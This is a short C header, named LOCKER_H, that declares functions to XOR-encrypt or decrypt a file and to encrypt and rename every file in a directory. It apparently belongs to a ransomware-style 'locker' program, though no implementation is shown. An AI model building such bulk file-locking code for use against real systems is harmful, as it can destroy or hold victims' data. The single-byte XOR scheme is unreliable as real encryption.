#ifndef LOCKER_H
#define LOCKER_H

// Encrypts or decrypts a file using XOR
void cryptFile(const char* filePath, char key);

// Processes a directory: encrypts/decrypts & renames files
void processDirectory(const char* basePath, char key);

#endif
